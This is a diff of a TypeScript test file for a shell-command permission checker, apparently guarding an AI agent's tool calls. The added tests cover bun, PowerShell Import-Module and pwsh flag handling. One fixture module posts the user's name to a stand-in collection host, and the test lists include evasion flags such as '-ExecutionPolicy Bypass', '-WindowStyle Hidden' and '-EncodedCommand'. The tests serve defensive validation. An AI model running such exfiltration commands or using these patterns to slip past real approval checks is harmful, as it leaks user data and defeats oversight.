@@ -526,8 +526,10 @@ test('A1 powershell・pwsh の -File の綴り違い（-f・-fi・-fil・-FILE�
 test('A2 実行を数え漏らさない: bun の <file>・source・. は実行に数える。道具と一緒の文（npx tsx x; bun evil.ts など）は持ち主。bun test・run・x は道具のまま、bun だけ・source だけは今までどおり持ち主', async t => {
   const files = { 'evil.ts': EVIL, 'run.ts': "console.log('run');\n", 'evil.sh': 'echo hi\n', 'evil.ps1': "Write-Output 'x'\n", 'package.json': '{}' };
   const owner = ['npm -v; bun evil.ts', 'npm -v; . ./evil.sh', 'source evil.sh; npx tsx run.ts', '. ./evil.ps1; npx tsx run.ts', 'npx tsx run.ts; bun evil.ts', 'npm test; bun evil.ts', 'bun evil.ts; npm test',
-    'bun test; bun evil.ts', 'source evil.sh; npm test', 'npm test; . ./evil.sh', 'sh -c "npm test; bun evil.ts"', 'bun evil.ts', 'bun --bun evil.ts', 'source evil.sh', '. ./evil.sh'];
-  const command = ['bun test', 'bun run build', 'bun x tsc', 'bun --version', 'bun -v; npm test', 'npm -v; bun --version', 'npx tsx run.ts', 'npm test'];
+    'bun test; bun evil.ts', 'source evil.sh; npm test', 'npm test; . ./evil.sh', 'sh -c "npm test; bun evil.ts"', 'bun evil.ts', 'bun --bun evil.ts', 'source evil.sh', '. ./evil.sh',
+    // 2026-11-26 shell-rest S1: bun run / bun x の先がファイルらしいときは、道具でなく実行（bun evil.ts と同じ扱い）
+    'npm test; bun run evil.ts', 'npm test; bun x ./evil.ts', 'bun run evil.ts', 'bun x ./evil.ts', 'bun run ./scripts/x', 'bun run $TARGET', 'npm test; bun run ev*'];
+  const command = ['bun test', 'bun run build', 'bun x tsc', 'bun x @biomejs/biome', 'bun --version', 'bun -v; npm test', 'npm -v; bun --version', 'npx tsx run.ts', 'npm test'];
   const shown = ['node run.ts; npm -v', 'node run.ts'];
   const wrong: string[] = [];
   for (const shell of SCOPE_SHELLS) {
@@ -555,4 +557,36 @@ test('A1 再審査: powershell・pwsh は --test があっても試験の道具�
   }
   assert.deepEqual(wrong, []);
   await ownerOnly(selfRunRig(t, c => { c.tools.shell.shell = 'bash'; }, files), 'powershell --test -fi x.ps1; node --test t.js');
+});
+
+// 2026-11-26 shell-rest S2: PowerShell の Import-Module（ipmo）はファイルのコードを動かす。先がファイルらしいときは、道具と一緒でも実行に数える（持ち主）。名前だけは今のまま
+test('S2 Import-Module・ipmo の先がファイルらしいときは持ち主（-Name の値・-Name:値 も）。名前だけの Import-Module Pester は今のまま（command）', t => {
+  if (!PS) return;
+  const files = { 'evil.psm1': "Invoke-RestMethod -Uri 'https://collect.example/x' -Method Post -Body $env:USERNAME\n", 'package.json': '{}' };
+  const r = selfRunRig(t, c => { c.tools.shell.shell = 'powershell'; }, files);
+  const owner = ['npm test; Import-Module ./evil.psm1', 'npm test; ipmo ./evil.psm1', 'npm test; Import-Module -Name .\\evil.psm1', 'npm test; IPMO .\\evil.psm1', 'npm test; Import-Module -Name:.\\evil.psm1',
+    'npm test; Import-Module evil.psm1', 'npm test; Import-Module C:\\mods\\x.dll', 'npm test; Import-Module $m', 'npm test; Import-Module ~/x'];
+  const command = ['npm test; Import-Module Pester', 'npm test; Import-Module -Name Pester -MinimumVersion 5.0', 'npm test; ipmo posh-git'];
+  const wrong: string[] = [];
+  for (const [want, list] of [['owner', owner], ['command', command]] as const) wrong.push(...list.filter(c => scopeOf(r, c) !== want).map(c => `${c} -> ${scopeOf(r, c)} (want ${want})`));
+  assert.deepEqual(wrong, []);
+});
+
+// 2026-11-26 shell-rest S5: pwsh・powershell は -Command があると残りをコマンドとして動かす。-File の前の語が「値を取らない許す旗」か「-ExecutionPolicy とその値」だけのときだけ、x.ps1 を判定役に見せる。ほかは持ち主
+test('S5 pwsh・powershell の -File の前に -Command・-EncodedCommand などがあれば持ち主。-NoProfile・-nop -ep Bypass など許す旗だけなら files（今のまま）', t => {
+  const files = { 'x.ps1': "Write-Output 'x'\n" };
+  const owner = ['-Command "Write-Output x" -File x.ps1', '-c "x" -File x.ps1', '-WindowStyle Hidden -File x.ps1', '-NoProfile -Command "x" -File x.ps1',
+    '-ep -File x.ps1', '-ep $p -File x.ps1', '-ExecutionPolicy -Command -File x.ps1', '-nop:$false -File x.ps1', '--test -File x.ps1', '$x -File x.ps1'];
+  const files_ = ['-NoProfile -File x.ps1', '-nop -ep Bypass -File x.ps1', '-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -File x.ps1', '-noni -nol -ex RemoteSigned -File x.ps1', '-NOPROFILE -fi x.ps1', '-File x.ps1'];
+  const wrong: string[] = [];
+  for (const shell of SCOPE_SHELLS) {
+    const r = selfRunRig(t, c => { c.tools.shell.shell = shell; }, files);
+    for (const program of ['powershell', 'pwsh']) {
+      for (const [want, list] of [['owner', owner], ['files', files_]] as const) wrong.push(...list.map(rest => `${program} ${rest}`).filter(c => scopeOf(r, c) !== want).map(c => `${shell}: ${c} -> ${scopeOf(r, c)} (want ${want})`));
+      // -EncodedCommand は -File があっても今も断る（持ち主より強い）。この束で変えない
+      const encoded = shellPreCheck({ command: `${program} -EncodedCommand AAA -File x.ps1` }, chat(r));
+      if (encoded.decision !== 'deny') wrong.push(`${shell}: ${program} -EncodedCommand AAA -File x.ps1 -> ${encoded.decision} (want deny)`);
+    }
+  }
+  assert.deepEqual(wrong, []);
 });
